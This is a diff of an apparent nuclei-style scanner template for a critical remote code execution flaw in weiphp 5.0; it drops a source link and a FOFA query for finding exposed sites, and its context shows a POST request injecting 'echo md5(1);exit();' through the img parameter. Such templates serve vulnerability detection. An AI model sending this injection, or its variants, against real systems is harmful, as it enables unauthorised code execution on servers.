@@ -3,12 +3,8 @@ info:
   name: weiphp5.0存在远程代码执行漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/rky21vi9ztcvz0ve'
+  description: ''
   tags: rce,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: rky21vi9ztcvz0ve
-    fofa: body="/css/weiphp.css" || title="weiphp" || title="weiphp4.0"
 http:
 - raw:
   - 'POST /public/index.php/weixin/Notice/index?img=echo+md5(1);exit(); HTTP/1.1
@@ -24,8 +20,6 @@ http:
 
 
     Content-Type: application/x-www-form-urlencoded
-
-
 
 
     <xml>
